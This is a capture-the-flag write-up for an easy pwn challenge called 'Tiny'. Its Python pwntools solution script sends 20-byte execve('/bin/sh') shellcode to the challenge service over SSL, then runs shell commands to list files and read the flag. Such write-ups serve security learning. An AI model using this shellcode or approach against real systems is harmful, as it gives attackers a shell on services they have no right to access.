---
title: Tiny
tags:
  - Pwn
Difficulty: Easy
---
### Description

It's just a tiny thing… but who knows, maybe it explodes into something HUGE 👀

File Provided: Tiny-Player.zip
### Solution

Solution script:

```python
#!/usr/bin/env python3
"""
Tiny Player PWN Challenge - Real Target with SSL
=================================================
Target: f181d0247c76045b.chal.ctf.ae:443 (SSL/TLS)
"""

from pwn import *

def exploit(host, port):
    """
    Exploit the Tiny Player service with SSL
    
    Args:
        host: Target host
        port: Target port
    
    Returns:
        Flag string
    """
    # Connect with SSL/TLS
    io = remote(host=host, port=port, ssl=True, sni=host)
    
    log.info("Connected with SSL/TLS")
    
    # Receive the welcome message
    welcome = io.recvuntil(b'executed.\n')
    log.info(f"Service says:\n{welcome.decode()}")
    
    # 20-byte execve("/bin/sh") shellcode
    shellcode = b'\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x0f\x05'
    
    log.info(f"Shellcode length: {len(shellcode)} bytes")
    log.info(f"Shellcode (hex): {shellcode.hex()}")
    log.success("Sending shellcode...")
    
    io.sendline(shellcode)
    
    # Wait for shell to spawn
    sleep(0.5)
    
    # List directory to find flag file
    log.info("Listing directory...")
    io.sendline(b'ls -la')
    
    # Read the flag
    log.info("Reading flag...")
    io.sendline(b'cat flag_*.txt')
    
    # Also try other common flag locations
    io.sendline(b'cat flag.txt 2>/dev/null')
    io.sendline(b'cat /flag.txt 2>/dev/null')
    
    # Exit shell
    io.sendline(b'exit')
    
    # Get all output
    output = io.recvall(timeout=3)
    io.close()
    
    # Parse flag from output
    output_str = output.decode(errors='ignore')
    log.info(f"Output:\n{output_str}")
    
    # Extract flag - try multiple formats
    flag_patterns = ['FLAG{', 'flag{']
    
    for prefix in flag_patterns:
        if prefix in output_str:
            flag_start = output_str.index(prefix)
            flag_end = output_str.index('}', flag_start) + 1
            flag = output_str[flag_start:flag_end]
            log.success(f"Flag found: {flag}")
            return flag
    
    log.error("Flag not found in output")
    log.info("Full output for manual inspection:")
    print(output_str)
    return None

if __name__ == "__main__":
    # Real target configuration
    HOST = 'f181d0247c76045b.chal.ctf.ae'
    PORT = 443
    
    log.info("=" * 60)
    log.info("Tiny Player PWN Challenge - REAL TARGET (SSL)")
    log.info(f"Target: {HOST}:{PORT}")
    log.info("=" * 60)
    
    try:
        flag = exploit(HOST, PORT)
        
        if flag:
            print()
            log.success("=" * 60)
            log.success(f"FLAG: {flag}")
            log.success("=" * 60)
        else:
            log.warning("Could not extract flag automatically")
            log.info("Check the output above for the flag")
    except Exception as e:
        log.error(f"Exploit failed: {e}")
        import traceback
        traceback.print_exc()
```